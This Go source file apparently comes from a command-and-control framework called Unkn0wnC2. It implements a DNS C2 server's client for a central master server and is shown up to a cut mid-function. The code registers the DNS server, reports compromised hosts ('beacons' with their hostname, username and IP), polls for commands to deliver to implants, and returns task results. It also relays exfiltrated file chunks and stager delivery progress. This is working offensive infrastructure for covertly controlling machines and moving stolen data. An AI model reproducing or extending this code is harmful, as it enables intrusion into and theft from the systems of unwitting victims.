// Package main implements the Master Server client for DNS C2 servers.
// This enables DNS servers to operate in distributed mode by reporting beacons,
// polling for tasks, and submitting results to the central Master Server.
package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"sync"
	"time"
)

// MasterClient handles communication with the Master Server
type MasterClient struct {
	masterURL    string
	serverID     string
	apiKey       string
	httpClient   *http.Client
	debug        bool
	lastCheckin  time.Time
	checkinMutex sync.RWMutex
}

// NewMasterClient creates a new master server client
func NewMasterClient(masterURL, serverID, apiKey string, tlsCACert string, tlsInsecure bool, debug bool) *MasterClient {
	// Configure HTTP client with TLS
	tlsConfig := &tls.Config{
		MinVersion:         tls.VersionTLS12,
		InsecureSkipVerify: tlsInsecure,
	}

	// If CA cert provided, load it
	if tlsCACert != "" {
		caCert, err := os.ReadFile(tlsCACert)
		if err != nil {
			if debug {
				fmt.Printf("[Master Client] Warning: Failed to load CA cert from %s: %v\n", tlsCACert, err)
			}
		} else {
			caCertPool := x509.NewCertPool()
			if caCertPool.AppendCertsFromPEM(caCert) {
				tlsConfig.RootCAs = caCertPool
				if debug {
					fmt.Printf("[Master Client] Loaded CA certificate from %s\n", tlsCACert)
				}
			} else {
				if debug {
					fmt.Printf("[Master Client] Warning: Failed to parse CA cert from %s\n", tlsCACert)
				}
			}
		}
	}

	tr := &http.Transport{
		TLSClientConfig:       tlsConfig,
		MaxIdleConns:           100,
		MaxIdleConnsPerHost:    20,
		MaxConnsPerHost:        50,
		IdleConnTimeout:        90 * time.Second,
		TLSHandshakeTimeout:   10 * time.Second,
	}

	return &MasterClient{
		masterURL: masterURL,
		serverID:  serverID,
		apiKey:    apiKey,
		httpClient: &http.Client{
			Transport: tr,
			Timeout:   30 * time.Second,
		},
		debug: debug,
	}
}

// Request/Response structures

type CheckinRequest struct {
	DNSServerID string                 `json:"dns_server_id"`
	APIKey      string                 `json:"api_key"`
	Status      string                 `json:"status"`
	Stats       map[string]interface{} `json:"stats"`
}

type CheckinResponse struct {
	Success                bool                  `json:"success"`
	Message                string                `json:"message"`
	PendingCaches          []StagerCacheTask     `json:"pending_caches,omitempty"`
	DomainUpdates          []string              `json:"domain_updates,omitempty"`
	CompletedExfilSessions []string              `json:"completed_exfil_sessions,omitempty"`
	MissingChunkRequests   []MissingChunkRequest `json:"missing_chunk_requests,omitempty"`
	BuildFormats           []string                                `json:"build_formats,omitempty"`
	BuildPhaseConfigs      map[string]map[string]interface{}       `json:"build_phase_configs,omitempty"`
}

// MissingChunkRequest represents a request for missing chunks from Master
type MissingChunkRequest struct {
	Type          string `json:"type"`          // "task" or "exfil"
	ID            string `json:"id"`            // task_id or session_id
	Tag           string `json:"tag,omitempty"` // exfil session tag for distributed lookup
	TotalChunks   int    `json:"total_chunks"`
	MissingChunks []int  `json:"missing_chunks"`
}

type StagerCacheTask struct {
	ClientBinaryID string   `json:"client_binary_id"`
	TotalChunks    int      `json:"total_chunks"`
	Chunks         []string `json:"chunks"` // All chunks for this binary
}

type BeaconReportRequest struct {
	DNSServerID string     `json:"dns_server_id"`
	APIKey      string     `json:"api_key"`
	Beacon      BeaconData `json:"beacon"`
}

type BeaconData struct {
	ID                string    `json:"id"`
	Hostname          string    `json:"hostname"`
	Username          string    `json:"username"`
	OS                string    `json:"os"`
	Arch              string    `json:"arch"`
	IPAddress         string    `json:"ip_address"`
	FirstSeen         time.Time `json:"first_seen"`
	LastSeen          time.Time `json:"last_seen"`
	BeaconName        string    `json:"beacon_name,omitempty"`
	BuildID           string    `json:"build_id,omitempty"`
	PayloadFormat     string    `json:"payload_format,omitempty"`
	Encoding          string    `json:"encoding,omitempty"`
	RegistrationStage *int      `json:"registration_stage,omitempty"`
}

type ResultSubmitRequest struct {
	DNSServerID string `json:"dns_server_id"`
	APIKey      string `json:"api_key"`
	TaskID      string `json:"task_id"`
	BeaconID    string `json:"beacon_id"`
	ChunkIndex  int    `json:"chunk_index"`
	TotalChunks int    `json:"total_chunks"`
	Data        string `json:"data"`
}

type ExfilChunkRequest struct {
	DNSServerID string `json:"dns_server_id"`
	APIKey      string `json:"api_key"`
	SessionID   string `json:"session_id"`
	JobID       string `json:"job_id"`
	ChunkIndex  int    `json:"chunk_index"`
	TotalChunks int    `json:"total_chunks"`
	PayloadB64  string `json:"payload_b64"`
	FileName    string `json:"file_name,omitempty"`
	FileSize    int64  `json:"file_size,omitempty"`
	IsFinal     bool   `json:"is_final"`
}

type ExfilCompleteRequest struct {
	DNSServerID    string `json:"dns_server_id"`
	APIKey         string `json:"api_key"`
	SessionID      string `json:"session_id"`
	JobID          string `json:"job_id"`
	FileName       string `json:"file_name,omitempty"`
	FileSize       int64  `json:"file_size,omitempty"`
	TotalChunks    int    `json:"total_chunks"`
	ReceivedChunks int    `json:"received_chunks"`
}

type TaskResponse struct {
	ID       string `json:"id"`
	BeaconID string `json:"beacon_id"`
	Command  string `json:"command"`
	Status   string `json:"status"`
}

type APIResponse struct {
	Success bool        `json:"success"`
	Message string      `json:"message"`
	Data    interface{} `json:"data"`
}

// doRequest performs an HTTP request to the Master Server with retry logic
func (mc *MasterClient) doRequest(method, endpoint string, body interface{}) ([]byte, error) {
	url := mc.masterURL + endpoint

	// Marshal body once (reuse the JSON bytes for retries)
	var jsonData []byte
	var err error
	if body != nil {
		jsonData, err = json.Marshal(body)
		if err != nil {
			return nil, fmt.Errorf("failed to marshal request: %w", err)
		}
	}

	// Retry logic with exponential backoff
	maxRetries := 3
	var lastErr error

	for attempt := 1; attempt <= maxRetries; attempt++ {
		// Create a new reader for each attempt (body can only be read once)
		var reqBody io.Reader
		if jsonData != nil {
			reqBody = bytes.NewBuffer(jsonData)
		}

		req, err := http.NewRequest(method, url, reqBody)
		if err != nil {
			return nil, fmt.Errorf("failed to create request: %w", err)
		}

		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("User-Agent", "Unkn0wnC2-DNSServer/0.3.0")
		req.Header.Set("X-DNS-Server-ID", mc.serverID)

		// Execute request
		resp, err := mc.httpClient.Do(req)
		if err != nil {
			lastErr = err
			if attempt < maxRetries {
				backoff := time.Duration(attempt*attempt) * time.Second
				if mc.debug {
					logf("[Master Client] Request failed (attempt %d/%d): %v, retrying in %v",
						attempt, maxRetries, err, backoff)
				}
				time.Sleep(backoff)
				continue
			}
			return nil, fmt.Errorf("request failed after %d attempts: %w", maxRetries, err)
		}
		// Read response body
		respBody, err := io.ReadAll(resp.Body)
		resp.Body.Close() // Close immediately, not deferred, to avoid leaks in retry loop
		if err != nil {
			return nil, fmt.Errorf("failed to read response: %w", err)
		}

		// Check status code
		if resp.StatusCode < 200 || resp.StatusCode >= 300 {
			if attempt < maxRetries && (resp.StatusCode == 500 || resp.StatusCode == 503) {
				// Retry on server errors
				lastErr = fmt.Errorf("server error: %d - %s", resp.StatusCode, string(respBody))
				backoff := time.Duration(attempt*attempt) * time.Second
				if mc.debug {
					logf("[Master Client] Server error (attempt %d/%d): %v, retrying in %v",
						attempt, maxRetries, lastErr, backoff)
				}
				time.Sleep(backoff)
				continue
			}
			return nil, fmt.Errorf("request failed with status %d: %s", resp.StatusCode, string(respBody))
		}

		return respBody, nil
	}

	return nil, fmt.Errorf("request failed after %d attempts: %w", maxRetries, lastErr)
}

// RegisterWithMaster registers this DNS server with the Master and retrieves active domain list
func (mc *MasterClient) RegisterWithMaster(domain, address string) ([]string, error) {
	req := struct {
		ServerID string `json:"server_id"`
		Domain   string `json:"domain"`
		Address  string `json:"address"`
		APIKey   string `json:"api_key"`
	}{
		ServerID: mc.serverID,
		Domain:   domain,
		Address:  address,
		APIKey:   mc.apiKey,
	}

	respData, err := mc.doRequest("POST", "/api/dns-server/register", req)
	if err != nil {
		return nil, fmt.Errorf("registration failed: %w", err)
	}

	var resp struct {
		Success bool   `json:"success"`
		Message string `json:"message"`
		Data    struct {
			ServerID string   `json:"server_id"`
			Domain   string   `json:"domain"`
			Domains  []string `json:"domains"`
		} `json:"data"`
	}

	if err := json.Unmarshal(respData, &resp); err != nil {
		return nil, fmt.Errorf("failed to parse registration response: %w", err)
	}

	if !resp.Success {
		return nil, fmt.Errorf("registration rejected: %s", resp.Message)
	}

	if mc.debug {
		logf("[Master Client] Registered with Master - %d active domains returned", len(resp.Data.Domains))
	}

	return resp.Data.Domains, nil
}

// Checkin sends a heartbeat to the Master Server
// Returns any pending stager cache tasks, domain updates, completed exfil sessions, and missing chunk requests
func (mc *MasterClient) Checkin(stats map[string]interface{}) ([]StagerCacheTask, []string, []string, []MissingChunkRequest, []string, map[string]*BeaconPhaseConfig, error) {
	req := CheckinRequest{
		DNSServerID: mc.serverID,
		APIKey:      mc.apiKey,
		Status:      "active",
		Stats:       stats,
	}

	respData, err := mc.doRequest("POST", "/api/dns-server/checkin", req)
	if err != nil {
		return nil, nil, nil, nil, nil, nil, fmt.Errorf("checkin failed: %w", err)
	}

	var resp CheckinResponse
	if err := json.Unmarshal(respData, &resp); err != nil {
		return nil, nil, nil, nil, nil, nil, fmt.Errorf("failed to parse checkin response: %w", err)
	}

	if !resp.Success {
		return nil, nil, nil, nil, nil, nil, fmt.Errorf("checkin rejected: %s", resp.Message)
	}

	mc.checkinMutex.Lock()
	mc.lastCheckin = time.Now()
	mc.checkinMutex.Unlock()

	if mc.debug {
		if len(resp.PendingCaches) > 0 {
			logf("[Master Client] Checkin successful - %d pending cache tasks", len(resp.PendingCaches))
		} else if len(resp.DomainUpdates) > 0 {
			logf("[Master Client] Checkin successful - domain update received: %v", resp.DomainUpdates)
		} else if len(resp.CompletedExfilSessions) > 0 {
			logf("[Master Client] Checkin successful - %d completed exfil sessions", len(resp.CompletedExfilSessions))
		} else if len(resp.MissingChunkRequests) > 0 {
			logf("[Master Client] Checkin successful - %d missing chunk requests", len(resp.MissingChunkRequests))
		} else {
			logf("[Master Client] Checkin successful")
		}
	}

	// Parse build phase configs from raw map into typed structs
	var parsedBPC map[string]*BeaconPhaseConfig
	if len(resp.BuildPhaseConfigs) > 0 {
		parsedBPC = make(map[string]*BeaconPhaseConfig, len(resp.BuildPhaseConfigs))
		for buildID, raw := range resp.BuildPhaseConfigs {
			pc := &BeaconPhaseConfig{}
			if v, ok := raw["reg_query_type"].(string); ok {
				pc.RegQueryType = v
			}
			if v, ok := raw["reg_encrypted"].(bool); ok {
				pc.RegEncrypted = v
			}
			if v, ok := raw["reg_ack_ip"].(string); ok {
				pc.RegACKIP = v
			}
			if v, ok := raw["poll_query_type"].(string); ok {
				pc.PollQueryType = v
			}
			if v, ok := raw["poll_encrypted"].(bool); ok {
				pc.PollEncrypted = v
			}
			if v, ok := raw["poll_ack_ip"].(string); ok {
				pc.PollACKIP = v
			}
			if v, ok := raw["poll_task_ip"].(string); ok {
				pc.PollTaskIP = v
			}
			if v, ok := raw["txt_follow_up_secs"].(float64); ok {
				pc.TxtFollowUpSecs = int(v)
			}
			if v, ok := raw["exfil_query_type"].(string); ok {
				pc.ExfilQueryType = v
			}
			if v, ok := raw["exfil_encrypted"].(bool); ok {
				pc.ExfilEncrypted = v
			}
			if v, ok := raw["exfil_ack_ip"].(string); ok {
				pc.ExfilACKIP = v
			}
			parsedBPC[buildID] = pc
		}
	}

	return resp.PendingCaches, resp.DomainUpdates, resp.CompletedExfilSessions, resp.MissingChunkRequests, resp.BuildFormats, parsedBPC, nil
}

// ReportBeacon reports a new or updated beacon to the Master Server
func (mc *MasterClient) ReportBeacon(beacon *Beacon) error {
	beaconData := BeaconData{
		ID:                beacon.ID,
		Hostname:          beacon.Hostname,
		Username:          beacon.Username,
		OS:                beacon.OS,
		Arch:              beacon.Arch,
		IPAddress:         beacon.IPAddress,
		FirstSeen:         beacon.FirstSeen,
		LastSeen:          beacon.LastSeen,
		BeaconName:        beacon.BeaconName,
		BuildID:           beacon.BuildID,
		PayloadFormat:     beacon.PayloadFormat,
		Encoding:          beacon.Encoding,
		RegistrationStage: beacon.RegistrationStage,
	}

	req := BeaconReportRequest{
		DNSServerID: mc.serverID,
		APIKey:      mc.apiKey,
		Beacon:      beaconData,
	}

	respData, err := mc.doRequest("POST", "/api/dns-server/beacon", req)
	if err != nil {
		return fmt.Errorf("beacon report failed: %w", err)
	}

	var resp APIResponse
	if err := json.Unmarshal(respData, &resp); err != nil {
		return fmt.Errorf("failed to parse beacon response: %w", err)
	}

	if !resp.Success {
		return fmt.Errorf("beacon report rejected: %s", resp.Message)
	}

	// Parse phase config from Archon's response and apply via synchronized method.
	// This covers the window before the first checkin pushes buildPhaseConfigs.
	if resp.Data != nil {
		if dataMap, ok := resp.Data.(map[string]interface{}); ok {
			if phaseRaw, ok := dataMap["phase_config"]; ok {
				if phaseMap, ok := phaseRaw.(map[string]interface{}); ok {
					pc := &BeaconPhaseConfig{}
					if v, ok := phaseMap["reg_query_type"].(string); ok {
						pc.RegQueryType = v
					}
					if v, ok := phaseMap["reg_encrypted"].(bool); ok {
						pc.RegEncrypted = v
					}
					if v, ok := phaseMap["reg_ack_ip"].(string); ok {
						pc.RegACKIP = v
					}
					if v, ok := phaseMap["poll_query_type"].(string); ok {
						pc.PollQueryType = v
					}
					if v, ok := phaseMap["poll_encrypted"].(bool); ok {
						pc.PollEncrypted = v
					}
					if v, ok := phaseMap["poll_ack_ip"].(string); ok {
						pc.PollACKIP = v
					}
					if v, ok := phaseMap["poll_task_ip"].(string); ok {
						pc.PollTaskIP = v
					}
					if v, ok := phaseMap["txt_follow_up_secs"].(float64); ok {
						pc.TxtFollowUpSecs = int(v)
					}
					if v, ok := phaseMap["exfil_query_type"].(string); ok {
						pc.ExfilQueryType = v
					}
					if v, ok := phaseMap["exfil_encrypted"].(bool); ok {
						pc.ExfilEncrypted = v
					}
					if v, ok := phaseMap["exfil_ack_ip"].(string); ok {
						pc.ExfilACKIP = v
					}
					if c2Manager != nil {
						c2Manager.SetBeaconPhaseConfig(beacon.ID, pc)
					}
					if mc.debug {
						logf("[Master Client] Phase config applied for beacon %s via ReportBeacon", beacon.ID)
					}
				}
			}
		}
	}

	if mc.debug {
		logf("[Master Client] Beacon reported: %s (%s@%s)", beacon.ID, beacon.Username, beacon.Hostname)
	}

	return nil
}

// ReportBeaconStatus sends a lightweight status update for a beacon to Archon
func (mc *MasterClient) ReportBeaconStatus(beaconID, status string) error {
	req := map[string]string{
		"beacon_id":     beaconID,
		"status":        status,
		"dns_server_id": mc.serverID,
		"api_key":       mc.apiKey,
	}

	_, err := mc.doRequest("POST", "/api/dns-server/beacon-status", req)
	if err != nil {
		return fmt.Errorf("beacon status report failed: %w", err)
	}
	return nil
}

// ForwardLogs sends buffered DNS server log entries to Archon
func (mc *MasterClient) ForwardLogs(entries []LogEntry) error {
	if len(entries) == 0 {
		return nil
	}

	req := map[string]interface{}{
		"dns_server_id": mc.serverID,
		"api_key":       mc.apiKey,
		"entries":       entries,
	}

	_, err := mc.doRequest("POST", "/api/dns-server/logs", req)
	if err != nil {
		return fmt.Errorf("log forwarding failed: %w", err)
	}
	return nil
}

// StartPeriodicLogForward begins periodic log forwarding to Archon
func (mc *MasterClient) StartPeriodicLogForward(interval time.Duration) {
	go func() {
		ticker := time.NewTicker(interval)
		defer ticker.Stop()
		for range ticker.C {
			entries := DrainLogBuffer()
			if len(entries) > 0 {
				if err := mc.ForwardLogs(entries); err != nil {
					if mc.debug {
						logf("[Master Client] Log forwarding failed: %v", err)
					}
				}
			}
		}
	}()
}

// PollTasks fetches pending tasks from the Master Server for local beacons
func (mc *MasterClient) PollTasks() ([]TaskResponse, error) {
	// Build query string with authentication
	endpoint := fmt.Sprintf("/api/dns-server/tasks?dns_server_id=%s&api_key=%s", mc.serverID, mc.apiKey)

	respData, err := mc.doRequest("GET", endpoint, nil)
	if err != nil {
		return nil, fmt.Errorf("task poll failed: %w", err)
	}

	// Parse response as task array
	var tasks []TaskResponse
	if err := json.Unmarshal(respData, &tasks); err != nil {
		return nil, fmt.Errorf("failed to parse tasks response: %w", err)
	}

	if mc.debug && len(tasks) > 0 {
		logf("[Master Client] Received %d task(s) from master", len(tasks))
	}

	return tasks, nil
}

// SubmitResult sends a task result (or result chunk) to the Master Server
// Returns (taskComplete, error) - taskComplete is true if this was the final chunk
func (mc *MasterClient) SubmitResult(taskID, beaconID string, chunkIndex, totalChunks int, data string) (bool, error) {
	req := ResultSubmitRequest{
		DNSServerID: mc.serverID,
		APIKey:      mc.apiKey,
		TaskID:      taskID,
		BeaconID:    beaconID,
		ChunkIndex:  chunkIndex,
		TotalChunks: totalChunks,
		Data:        data,
	}

	respData, err := mc.doRequest("POST", "/api/dns-server/result", req)
	if err != nil {
		return false, fmt.Errorf("result submit failed: %w", err)
	}

	var resp APIResponse
	if err := json.Unmarshal(respData, &resp); err != nil {
		return false, fmt.Errorf("failed to parse result response: %w", err)
	}

	if !resp.Success {
		return false, fmt.Errorf("result submit rejected: %s", resp.Message)
	}

	// Check if task is complete (Master signals this after receiving all chunks)
	taskComplete := false
	if dataMap, ok := resp.Data.(map[string]interface{}); ok {
		if complete, exists := dataMap["task_complete"]; exists {
			if completeBool, ok := complete.(bool); ok {
				taskComplete = completeBool
			}
		}
	}

	if mc.debug {
		if taskComplete {
			logf("[Master Client] Result submitted: Task %s COMPLETE (chunk %d/%d)", taskID, chunkIndex, totalChunks)
		} else {
			logf("[Master Client] Result submitted: Task %s, chunk %d/%d", taskID, chunkIndex, totalChunks)
		}
	}

	return taskComplete, nil
}

// SubmitExfilChunk forwards a dedicated exfil client chunk to the Master Server
func (mc *MasterClient) SubmitExfilChunk(req ExfilChunkRequest) (bool, error) {
	req.DNSServerID = mc.serverID
	req.APIKey = mc.apiKey

	respData, err := mc.doRequest("POST", "/api/dns-server/exfil/chunk", req)
	if err != nil {
		return false, fmt.Errorf("exfil chunk submit failed: %w", err)
	}

	var resp APIResponse
	if err := json.Unmarshal(respData, &resp); err != nil {
		return false, fmt.Errorf("failed to parse exfil chunk response: %w", err)
	}

	if !resp.Success {
		return false, fmt.Errorf("exfil chunk rejected: %s", resp.Message)
	}

	// Check if session is complete (Master signals this after receiving all chunks)
	sessionComplete := false
	if dataMap, ok := resp.Data.(map[string]interface{}); ok {
		if complete, exists := dataMap["completed"]; exists {
			if completeBool, ok := complete.(bool); ok {
				sessionComplete = completeBool
			}
		}
	}

	return sessionComplete, nil
}

// RegisterExfilTag registers a session tag with the Master Server
func (mc *MasterClient) RegisterExfilTag(tag string, sessionID string) error {
	req := map[string]interface{}{
		"dns_server_id": mc.serverID,
		"api_key":       mc.apiKey,
		"tag":           tag,
		"session_id":    sessionID,
	}

	respData, err := mc.doRequest("POST", "/api/dns-server/exfil/tag", req)
	if err != nil {
		return fmt.Errorf("exfil tag registration failed: %w", err)
	}

	var resp APIResponse
	if err := json.Unmarshal(respData, &resp); err != nil {
		return fmt.Errorf("failed to parse exfil tag response: %w", err)
	}

	if !resp.Success {
		return fmt.Errorf("exfil tag registration rejected: %s", resp.Message)
	}

	return nil
}

// SubmitExfilChunkByTag submits a chunk using only the tag (for distributed exfil)
func (mc *MasterClient) SubmitExfilChunkByTag(tag string, chunkIndex int, payloadB64 string) (bool, error) {
	req := map[string]interface{}{
		"dns_server_id": mc.serverID,
		"api_key":       mc.apiKey,
		"tag":           tag,
		"chunk_index":   chunkIndex,
		"payload_b64":   payloadB64,
	}

	respData, err := mc.doRequest("POST", "/api/dns-server/exfil/chunk/tagged", req)
	if err != nil {
		return false, fmt.Errorf("tagged exfil chunk submit failed: %w", err)
	}

	var resp APIResponse
	if err := json.Unmarshal(respData, &resp); err != nil {
		return false, fmt.Errorf("failed to parse tagged exfil chunk response: %w", err)
	}

	if !resp.Success {
		return false, fmt.Errorf("tagged exfil chunk rejected: %s", resp.Message)
	}

	// Check if session is complete
	sessionComplete := false
	if dataMap, ok := resp.Data.(map[string]interface{}); ok {
		if complete, exists := dataMap["completed"]; exists {
			if completeBool, ok := complete.(bool); ok {
				sessionComplete = completeBool
			}
		}
	}

	return sessionComplete, nil
}

// MarkExfilComplete notifies the Master Server that a session finished transferring
func (mc *MasterClient) MarkExfilComplete(req ExfilCompleteRequest) error {
	req.DNSServerID = mc.serverID
	req.APIKey = mc.apiKey

	respData, err := mc.doRequest("POST", "/api/dns-server/exfil/complete", req)
	if err != nil {
		return fmt.Errorf("exfil completion submit failed: %w", err)
	}

	var resp APIResponse
	if err := json.Unmarshal(respData, &resp); err != nil {
		return fmt.Errorf("failed to parse exfil completion response: %w", err)
	}

	if !resp.Success {
		return fmt.Errorf("exfil completion rejected: %s", resp.Message)
	}

	return nil
}

// MarkExfilCompleteByTag notifies the Master Server that a session finished transferring using only the tag
func (mc *MasterClient) MarkExfilCompleteByTag(tag string) error {
	req := map[string]interface{}{
		"dns_server_id": mc.serverID,
		"api_key":       mc.apiKey,
		"tag":           tag,
	}

	respData, err := mc.doRequest("POST", "/api/dns-server/exfil/complete/tagged", req)
	if err != nil {
		return fmt.Errorf("tagged exfil completion submit failed: %w", err)
	}

	var resp APIResponse
	if err := json.Unmarshal(respData, &resp); err != nil {
		return fmt.Errorf("failed to parse tagged exfil completion response: %w", err)
	}

	if !resp.Success {
		return fmt.Errorf("tagged exfil completion rejected: %s", resp.Message)
	}

	return nil
}

// MarkTaskComplete notifies the Master that the beacon has finished exfiltrating all chunks
// This is called when the DNS server receives the RESULT_COMPLETE message from the beacon
func (mc *MasterClient) MarkTaskComplete(taskID, beaconID string, totalChunks int) error {
	req := struct {
		DNSServerID string `json:"dns_server_id"`
		APIKey      string `json:"api_key"`
		TaskID      string `json:"task_id"`
		BeaconID    string `json:"beacon_id"`
		TotalChunks int    `json:"total_chunks"`
	}{
		DNSServerID: mc.serverID,
		APIKey:      mc.apiKey,
		TaskID:      taskID,
		BeaconID:    beaconID,
		TotalChunks: totalChunks,
	}

	respData, err := mc.doRequest("POST", "/api/dns-server/result/complete", req)
	if err != nil {
		return fmt.Errorf("failed to mark task complete: %w", err)
	}

	var resp APIResponse
	if err := json.Unmarshal(respData, &resp); err != nil {
		return fmt.Errorf("failed to parse response: %w", err)
	}

	if !resp.Success {
		return fmt.Errorf("request rejected: %s", resp.Message)
	}

	if mc.debug {
		logf("[Master Client] Task %s marked as COMPLETE (%d chunks)", taskID, totalChunks)
	}

	return nil
}

// MarkTaskDelivered notifies the Master that this DNS server delivered a task to a beacon
// This prevents other DNS servers from delivering the same task (Shadow Mesh coordination)
func (mc *MasterClient) MarkTaskDelivered(taskID string) error {
	req := struct {
		DNSServerID string `json:"dns_server_id"`
		APIKey      string `json:"api_key"`
		TaskID      string `json:"task_id"`
	}{
		DNSServerID: mc.serverID,
		APIKey:      mc.apiKey,
		TaskID:      taskID,
	}

	respData, err := mc.doRequest("POST", "/api/dns-server/tasks/delivered", req)
	if err != nil {
		return fmt.Errorf("failed to mark task as delivered: %w", err)
	}

	var resp APIResponse
	if err := json.Unmarshal(respData, &resp); err != nil {
		return fmt.Errorf("failed to parse response: %w", err)
	}

	if !resp.Success {
		return fmt.Errorf("request rejected: %s", resp.Message)
	}

	if mc.debug {
		logf("[Master Client] Task %s marked as delivered", taskID)
	}

	return nil
}

// MarkTaskDeliveredFast is a single-attempt, 2-second-timeout variant of MarkTaskDelivered.
// Used when the caller needs a best-effort synchronous claim before returning a TASK response,
// so that Archon removes the task from the pending list before the next DNS server poll (10s).
func (mc *MasterClient) MarkTaskDeliveredFast(taskID string) error {
	body := struct {
		DNSServerID string `json:"dns_server_id"`
		APIKey      string `json:"api_key"`
		TaskID      string `json:"task_id"`
	}{
		DNSServerID: mc.serverID,
		APIKey:      mc.apiKey,
		TaskID:      taskID,
	}

	jsonData, err := json.Marshal(body)
	if err != nil {
		return fmt.Errorf("failed to marshal request: %w", err)
	}

	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, "POST", mc.masterURL+"/api/dns-server/tasks/delivered", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("failed to create request: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-DNS-Server-ID", mc.serverID)

	fastClient := &http.Client{Transport: mc.httpClient.Transport}
	resp, err := fastClient.Do(req)
	if err != nil {
		return fmt.Errorf("request failed: %w", err)
	}
	respBody, _ := io.ReadAll(resp.Body)
	resp.Body.Close()

	var apiResp APIResponse
	if err := json.Unmarshal(respBody, &apiResp); err != nil {
		return fmt.Errorf("failed to parse response: %w", err)
	}
	if !apiResp.Success {
		return fmt.Errorf("request rejected: %s", apiResp.Message)
	}

	if mc.debug {
		logf("[Master Client] Task %s marked as delivered (fast)", taskID)
	}
	return nil
}

// SyncBeacons fetches all active beacons from the Master Server
// This allows DNS servers to be aware of beacons registered on other servers
func (mc *MasterClient) SyncBeacons() ([]BeaconData, error) {
	// Build query string with authentication
	endpoint := fmt.Sprintf("/api/dns-server/beacons?dns_server_id=%s&api_key=%s", mc.serverID, mc.apiKey)

	respData, err := mc.doRequest("GET", endpoint, nil)
	if err != nil {
		return nil, fmt.Errorf("beacon sync failed: %w", err)
	}

	// Parse response as beacon array
	var beacons []BeaconData
	if err := json.Unmarshal(respData, &beacons); err != nil {
		return nil, fmt.Errorf("failed to parse beacons response: %w", err)
	}

	if mc.debug && len(beacons) > 0 {
		logf("[Master Client] Synced %d beacon(s) from master", len(beacons))
	}

	return beacons, nil
}

// SubmitProgress sends task progress update to the Master Server
func (mc *MasterClient) SubmitProgress(taskID, beaconID string, receivedChunks, totalChunks int, status string) error {
	req := map[string]interface{}{
		"dns_server_id":   mc.serverID,
		"api_key":         mc.apiKey,
		"task_id":         taskID,
		"beacon_id":       beaconID,
		"received_chunks": receivedChunks,
		"total_chunks":    totalChunks,
		"status":          status,
	}

	respData, err := mc.doRequest("POST", "/api/dns-server/progress", req)
	if err != nil {
		return fmt.Errorf("progress submit failed: %w", err)
	}

	var resp APIResponse
	if err := json.Unmarshal(respData, &resp); err != nil {
		return fmt.Errorf("failed to parse progress response: %w", err)
	}

	if !resp.Success {
		return fmt.Errorf("progress submit rejected: %s", resp.Message)
	}

	return nil
}

// ReportStagerContact reports that a stager made first contact with this DNS server (from cache)
// Returns the Master-assigned session ID for progress tracking
func (mc *MasterClient) ReportStagerContact(clientBinaryID, stagerIP, os, arch string) (string, error) {
	req := map[string]interface{}{
		"dns_server_id":    mc.serverID,
		"api_key":          mc.apiKey,
		"client_binary_id": clientBinaryID,
		"stager_ip":        stagerIP,
		"os":               os,
		"arch":             arch,
	}

	respData, err := mc.doRequest("POST", "/api/dns-server/stager/contact", req)
	if err != nil {
		return "", fmt.Errorf("stager contact report failed: %w", err)
	}

	// Parse JSON response to extract session_id
	var resp map[string]interface{}
	if err := json.Unmarshal(respData, &resp); err != nil {
		// If we can't parse, just return empty session_id (backward compatibility)
		return "", nil
	}

	// Extract session_id from response data
	if data, ok := resp["data"].(map[string]interface{}); ok {
		if sessionID, ok := data["session_id"].(string); ok {
			return sessionID, nil
		}
	}

	// Fallback if Master doesn't return session_id (backward compatibility)
	return "", nil
}

// ReportStagerProgress reports chunk delivery progress for a stager session
func (mc *MasterClient) ReportStagerProgress(sessionID string, chunkIndex int, stagerIP string) error {
	req := map[string]interface{}{
		"dns_server_id": mc.serverID,
		"api_key":       mc.apiKey,
		"session_id":    sessionID,
		"chunk_index":   chunkIndex,
		"stager_ip":     stagerIP,
	}

	// Fire-and-forget with no retries to reduce Master load
	// Use a short timeout for progress reports
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	jsonData, err := json.Marshal(req)
	if err != nil {
		return fmt.Errorf("failed to marshal progress request: %w", err)
	}

	url := fmt.Sprintf("%s/api/dns-server/stager/progress", mc.masterURL)
	httpReq, err := http.NewRequestWithContext(ctx, "POST", url, bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("failed to create progress request: %w", err)
	}
	httpReq.Header.Set("Content-Type", "application/json")

	resp, err := mc.httpClient.Do(httpReq)
	if err != nil {
		return fmt.Errorf("progress report failed: %w", err)
	}
	defer resp.Body.Close()

	// Don't even check the response - truly fire-and-forget
	return nil
}

// SendMissingChunks sends locally stored chunks that Master is missing
func (mc *MasterClient) SendMissingChunks(id string, chunkType string, chunks map[int][]byte) error {
	// Encode chunks to base64 for JSON transmission
	encodedChunks := make(map[string]string)
	for idx, data := range chunks {
		encodedChunks[fmt.Sprintf("%d", idx)] = base64.StdEncoding.EncodeToString(data)
	}

	req := map[string]interface{}{
		"dns_server_id": mc.serverID,
		"api_key":       mc.apiKey,
		"id":            id,
		"type":          chunkType,
		"chunks":        encodedChunks,
	}

	_, err := mc.doRequest("POST", "/api/dns-server/missing-chunks", req)
	if err != nil {
		return fmt.Errorf("failed to send missing chunks: %w", err)
	}

	if mc.debug {
		logf("[Master Client] Sent %d missing chunks for %s %s", len(chunks), chunkType, id)
	}
	return nil
}

// StartPeriodicCheckin starts a background goroutine for periodic check-ins.
// Fires immediately on first call, then every interval thereafter.
func (mc *MasterClient) StartPeriodicCheckin(interval time.Duration, statsFn func() map[string]interface{}, cacheHandler func([]StagerCacheTask), domainHandler func([]string), exfilHandler func([]string), missingChunkHandler func([]MissingChunkRequest), buildFormatHandler func([]string), buildPhaseConfigHandler func(map[string]*BeaconPhaseConfig)) {
	doCheckin := func() {
		stats := statsFn()
		cacheTasks, domainUpdates, completedExfil, missingChunks, buildFormats, buildPhaseConfigs, err := mc.Checkin(stats)
		if err != nil {
			if mc.debug {
				logf("[Master Client] Checkin error: %v", err)
			}
			return
		}

		if len(cacheTasks) > 0 && cacheHandler != nil {
			cacheHandler(cacheTasks)
		}
		if len(domainUpdates) > 0 && domainHandler != nil {
			domainHandler(domainUpdates)
		}
